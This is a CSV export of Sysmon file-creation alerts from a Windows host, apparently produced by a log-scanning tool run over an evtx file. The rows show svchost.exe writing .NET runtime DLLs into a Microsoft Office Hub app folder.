"2025-12-26 11:29:12.068 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174999,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\Microsoft.DiaSymReader.Native.amd64.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.068 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.068","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.068 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175000,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\Microsoft.VisualBasic.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.068 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.068","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.069 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175001,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\Microsoft.VisualBasic.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.068 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.068","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.070 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175002,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\Microsoft.Win32.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.068 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.068","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.071 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175003,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\Microsoft.Win32.Registry.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.070 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.070","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.071 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175004,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\mscordaccore.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.070 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.070","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.072 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175005,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\mscordaccore_amd64_amd64_8.0.2025.41914.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.070 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.070","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.073 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175006,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\mscordbi.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.072 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.072","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.073 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175007,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\mscorlib.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.072 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.072","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.074 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175008,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\mscorrc.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.072 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.072","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.075 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175009,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\msquic.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.074 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.074","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.076 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175010,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\netstandard.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.074 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.074","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.076 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175011,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.AppContext.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.074 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.076","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.077 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175012,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Buffers.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.076 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.076","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.078 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175013,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Collections.Concurrent.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.076 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.076","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.079 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175014,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Collections.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.078 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.078","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.079 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175015,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Collections.Immutable.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.078 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.078","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.080 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175016,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Collections.NonGeneric.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.079 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.079","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.080 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175017,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Collections.Specialized.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.079 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.079","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.082 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175018,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ComponentModel.Annotations.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.079 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.079","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.083 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175019,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ComponentModel.DataAnnotations.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.081 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.081","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.083 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175020,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ComponentModel.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.081 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.081","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.083 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175021,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ComponentModel.EventBasedAsync.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.081 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.081","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.085 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175022,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ComponentModel.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.083 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.083","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.085 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175023,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ComponentModel.TypeConverter.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.083 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.083","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.086 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175024,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Configuration.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.083 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.083","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.086 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175025,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Console.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.083 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.083","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.086 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175026,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.083 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.083","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.090 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175027,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Data.Common.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.085 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.085","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.094 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175028,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Data.DataSetExtensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.085 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.087","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.094 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175029,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Data.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.089 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.089","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.095 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175030,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.Contracts.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.089 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.089","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.096 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175031,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.Debug.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.091 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.091","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.096 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175032,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.DiagnosticSource.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.091 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.091","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.096 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175033,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.FileVersionInfo.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.091 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.091","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.097 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175034,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.Process.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.093 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.093","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.097 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175035,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.StackTrace.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.093 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.093","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
